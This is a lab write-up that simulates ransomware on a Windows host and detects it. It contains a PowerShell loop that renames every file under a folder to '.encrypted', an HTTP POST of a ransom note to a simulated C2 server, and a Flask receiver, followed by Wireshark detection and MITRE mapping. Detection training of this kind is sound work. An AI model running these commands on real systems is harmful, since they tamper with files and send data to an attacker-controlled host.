
# 🛠️ Scenario 8 — Ransomware Simulation (File Encryption + Exfiltration)

This lab simulates ransomware behavior on a Windows victim: file encryption followed by ransom note exfiltration over HTTP. The goal is to monitor and detect this activity using tools like **Wireshark**, aligning with real-world MITRE ATT&CK techniques.

---

## 🧪 Red Team Activity

### 🖥️ Simulated File Encryption (PowerShell)
We recursively renamed all files under `C:\Data` to mimic encryption:

```powershell
Get-ChildItem -Path C:\Data -Recurse | ForEach-Object {
    Rename-Item $_.FullName ($_.FullName + ".encrypted")
}
```

---

### 📤 Ransom Note Exfiltration via HTTP

We used `Invoke-WebRequest` to simulate sending a ransom note back to a Command & Control (C2) server:

```powershell
Invoke-WebRequest -Uri http://192.168.2.131:8080/ransom_note.txt -Method POST -Body "Pay up"
```

📷 **PowerShell Output:**
![PowerShell POST](./screenshots/Screenshot%202025-09-01%20130711.png)

---

## 🖥️ Flask Server on Kali (Simulated C2)

A simple Flask server received the ransom note:

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/ransom_note.txt', methods=['POST'])
def receive():
    data = request.data.decode('utf-8', errors='ignore')
    print(f"[+] Received ransom note: {data}")
    with open('received_ransom_note.txt', 'a', encoding='utf-8') as f:
        f.write(data + '\n-----\n')
    return 'OK\n', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

📷 **Server Output:**
![POST received](./screenshots/Screenshot%202025-09-01%20130730.png)

---

## 🧠 Blue Team Detection (Wireshark)

Using the following display filter, we captured the POST request to the attacker:

```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
```

📷 **Wireshark Capture:**
![Wireshark POST](./screenshots/Screenshot%202025-09-01%20130117.png)

This revealed:
- **Source IP:** 192.168.2.129 (Windows victim)
- **Destination IP:** 192.168.2.131:8080 (Kali C2)
- **Protocol:** HTTP POST
- **Payload:** `Pay up`

---

## 📁 File Received on Attacker

The ransom note was written to the attacker's `received_ransom_note.txt`.

📷 **Ransom Note Contents:**
![Cat ransom note](./screenshots/Screenshot%202025-09-01%20130104.png)

---

## 🧩 MITRE ATT&CK Mapping

| Technique ID | Technique Name                 | Simulation |
|--------------|--------------------------------|------------|
| T1486        | Data Encrypted for Impact      | `.encrypted` suffix added |
| T1041        | Exfiltration Over C2 Channel   | HTTP POST to Flask server |

---

## ✅ Outcome

- Successfully simulated ransomware encryption and exfiltration
- Captured POST in Wireshark
- File was written on attacker's C2 server
- Fully observable & repeatable for detection testing

---

## 📂 Screenshots

Place these files in a `/screenshots/` folder in your repo:

| File Name | Description |
|-----------|-------------|
| `Screenshot 2025-09-01 130711.png` | PowerShell POST |
| `Screenshot 2025-09-01 130730.png` | Flask server receiving POST |
| `Screenshot 2025-09-01 130117.png` | Wireshark capture |
| `Screenshot 2025-09-01 130104.png` | Kali note file |
| `Screenshot 2025-09-01 125532.png` | Flask POST log |
